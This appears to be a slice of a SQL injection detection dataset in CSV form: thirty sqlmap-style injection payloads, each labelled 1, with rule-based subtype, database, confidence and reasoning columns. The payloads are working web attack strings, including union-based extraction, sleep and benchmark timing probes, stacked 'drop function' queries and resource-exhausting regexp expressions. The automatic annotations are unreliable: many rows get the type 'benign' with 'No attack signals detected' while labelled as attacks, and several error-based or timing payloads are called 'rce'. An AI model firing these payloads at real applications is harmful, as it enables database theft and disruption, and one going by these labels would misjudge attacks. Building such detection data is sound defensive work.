row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
3000,( select 2412 = ( 'qqpjq'|| ( select case 2412 when 2412 then 1 else 0 end from rdb$database ) ||'qzvzq' ) ),1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3001,-6890' ) ) or 5771 = 7721--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3002,if ( 9431 = 6730 ) select 9431 else drop function xbkh--,1,,stacked_queries,generic,0.95,drop function detected — stacked_queries injection (priority 3) on generic,rule-based
3003,"1"" ) where 4739 = 4739 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
3004,"1' or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
3005,"1"" ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ""vxec"" like ""vxec",1,,rce,generic,0.95,0x76555642 detected — rce injection (priority 1) on generic,rule-based
3006,"1' or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and 'eznq' like 'eznq",1,,rce,generic,0.95,0x694a4745 detected — rce injection (priority 1) on generic,rule-based
3007,1'|| ( select 'hwdj' where 8179 = 8179,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3008,1 ) as usnn where 3201 = 3201,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3009,select ( case when ( 9816 = 1693 ) then 9816 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3010,"1%"" ) and 8715 = 5529",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3011,"1%' ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3012,"1 ) ) ) union all select null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3013,"1 ) where 3076 = 3076 union all select null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3014,select ( case when ( 9931 = 3424 ) then 1 else 9931* ( select 9931 from master..sysdatabases ) end ) --,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3015,"1"" ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ""liar"" = ""liar",1,,boolean_blind,firebird,0.95,) and ( detected — boolean_blind injection (priority 8) on firebird,rule-based
3016,1'+ ( select tzvm where 5145 = 5145 and 4192 = 7437#,1,,boolean_blind,generic,0.95,5145 = 5145 and detected — boolean_blind injection (priority 8) on generic,rule-based
3017,"1"" ) ) as ydkd where 2455 = 2455 and sleep ( 5 ) --",1,,time_blind,mysql,0.95,"sleep (, and sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
3018,"-4148%"" ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( ""%"" = """,1,,boolean_blind,generic,0.95,) or ( detected — boolean_blind injection (priority 8) on generic,rule-based
3019,end and ( 'nchh' = 'nchh,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3020,1' or sleep ( 5 ) #,1,,time_blind,mysql,0.95,"sleep (, or sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
3021,"1"" ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ""dplf"" like ""dplf",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
3022,-7239' or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and 'cswv' = 'cswv,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3023,"1'|| ( select 'xhqy' where 4531 = 4531 union all select null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3024,"-6746"" ) or ( 8459 = 8459 ) *4906 and ( ""kohi"" like ""kohi",1,,boolean_blind,generic,0.95,") or (, like "" detected — boolean_blind injection (priority 8) on generic",rule-based
3025,"-6667%"" ) ) union all select 7348,7348,7348,7348,7348,7348,7348,7348#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3026,"1%' or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and '%' = '",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3027,1'|| ( select 'yuku' where 7480 = 7480,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3028,"1' ) union all select null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3029,"-8319"" ) ) or 7878 = 5970 and ( ( ""jcaz"" like ""jcaz",1,,boolean_blind,generic,0.95,"7878 = 5970 and, like "" detected — boolean_blind injection (priority 8) on generic",rule-based
